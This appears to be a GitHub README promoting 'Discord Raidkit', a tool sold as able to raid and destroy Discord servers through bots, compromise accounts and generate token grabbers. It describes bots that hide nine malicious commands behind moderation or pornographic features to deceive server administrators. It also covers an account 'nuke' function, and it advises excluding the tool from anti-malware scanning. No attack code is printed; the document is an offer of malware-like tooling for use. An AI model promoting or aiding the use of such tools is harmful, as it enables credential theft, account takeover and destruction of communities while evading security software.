Discord Raidkit is an open-source, forever free tool that allows you to raid and destroy Discord servers via Discord bots, compromise Discord accounts, and generate Discord token grabbers.

[Have a feature suggestion? Make one here!](https://github.com/the-cult-of-integral/discord-raidkit/discussions/categories/ideas)

![Discord Raidkit v2.4.4 Console](https://user-images.githubusercontent.com/98130822/235321378-f624a5ba-5ff6-4f80-b37e-8a1691724c53.png)

## Tools

- **Anubis** is a Discord bot with [nine malicious commands](#malicious-bot-commands). However, unlike other nuking tools, Anubis also has several non-malicious slash commands, including a moderation suite, to help you convince server administration to add the bot.

- **Qetesh** is a Discord bot with [nine malicious commands](#malicious-bot-commands). However, Qetesh also has 25 NSFW slash commands for the most popular pornographic kinks, at least according to PornHub. These commands should help take advantage of the degeneracy of Discord users.

- **Osiris** is the account manager of Discord Raidkit. Using Osiris, you can save the information of an account, login to an account using either Chrome, Firefox, or Microsoft Edge, or you can fully nuke an account, deleting channels, guilds, friends, and connections, deauthorizing applications, removing hype squad, and PATCHing various account settings. You can also generate Discord token grabbers within Windows Registry support. As of v2.4.2, Osiris has beta support for proxies.
 
Remember, if you need help setting these tools, you can always visit the [Discord Raidkit Wiki](https://github.com/the-cult-of-integral/discord-raidkit/wiki)!
 
## Installation

1. Head over to [the latest release](https://github.com/the-cult-of-integral/discord-raidkit/releases/latest).
2. Download the EXE zip.
3. Extract and run the executable in its directory.

**Notice:** Some anti-malware may flag this project as harmful ‚Äî especially any files that relate to Osiris, as this tool generates token stealers. If you are having issues with anti-malware constantly getting in the way of using this tool, you can create a folder, add that folder to the anti-malwares list of excluded search/scan locations, then place the Discord Raidkit files in said folder. This should allow Discord Raidkit to function correctly without interferance. **Do not randomly exclude every location on your computer!**

## v3.0.0 coming soon?

If you're wondering where I have been the past few months, I've been learning more front-end development. Here's a little screenshot of a secret, little thing I've been working on. Due to the way discord.py works, I can't promise I'll be able to create a fully functional web version of Discord Raidkit, but you never know! No promises though!
